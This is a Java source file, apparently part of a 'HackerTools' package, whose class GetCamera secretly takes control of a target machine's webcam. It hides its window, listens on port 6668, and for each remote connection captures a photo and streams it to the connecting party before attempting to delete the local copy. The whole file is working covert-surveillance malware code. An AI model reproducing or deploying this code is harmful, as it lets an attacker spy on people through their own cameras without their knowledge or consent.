package HackerTools;

import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;

import javax.swing.JFrame;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamPanel;
import com.github.sarxos.webcam.WebcamResolution;
import com.github.sarxos.webcam.WebcamUtils;
import com.github.sarxos.webcam.util.ImageUtils;

/**
 * 用于获取目标机摄像头
 * */
public class GetCamera {
    /**
     * 测试摄像头,拍摄并存储图片
     * */
    public static void cameraTest() throws IOException, InterruptedException {
        int num = 0;
        final Webcam webcam = Webcam.getDefault();
        webcam.setViewSize(WebcamResolution.VGA.getSize());
        WebcamPanel panel = new WebcamPanel(webcam);
        panel.setFPSDisplayed(true);
        panel.setDisplayDebugInfo(true);
        panel.setImageSizeDisplayed(true);
        panel.setMirrored(true);

        final JFrame window = new JFrame("摄像头");
        window.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosed(WindowEvent e) {
                webcam.close();
                window.dispose();
            }
        });

        File file = new File("picture"); // 创建文件夹存储图片
        if (!file.exists()) {
            file.mkdir();
        }

        window.setVisible(false);

        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket(6668);
            serverSocket.setSoTimeout(999999999);
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        if (serverSocket != null) {
            while (true) {
                try {
                    if(num<500){
                        System.out.println("等待远程连接，端口号为："
                                + serverSocket.getLocalPort() + "...");
                        Socket server = serverSocket.accept();

                        final String fileName =file.getAbsolutePath()+"\\"+ "photo" + num;
                        System.out.println(num);
                        WebcamUtils
                                .capture(webcam, fileName, ImageUtils.FORMAT_PNG);
                        num++;

                        File pathFile = new File(".");
                        String path = pathFile.getAbsolutePath();
                        int k = num-1;// 图片记录

                        File file_delete=new File(file.getAbsolutePath()+ "photo" + k + ".png");
                        FileInputStream fis = new FileInputStream(file.getAbsolutePath()+"\\"+ "photo" + k + ".png");
                        OutputStream out = server.getOutputStream();
                        byte[] buf = new byte[1024];
                        int len = 0;
                        while ((len = fis.read(buf)) != -1) {
                            out.write(buf, 0, len);
                        }
                        server.shutdownOutput();
                        InputStream in = server.getInputStream();
                        byte[] bufin = new byte[1024];
                        int cnt = in.read(bufin);
                        // System.out.println(new String(bufin,0,num));
                        fis.close();
                        out.close();
                        in.close();
                        server.close();
                        file_delete.delete();//文件删除
                        k++;

                        Thread.sleep(200);
                    }
                    else{
                        num=0;
                    }
                } catch (SocketTimeoutException s) {
                    System.out.println("Socket timed out!");
                    break;
                } catch (IOException e) {
                    e.printStackTrace();
                    break;
                }
            }
        }
    }
}
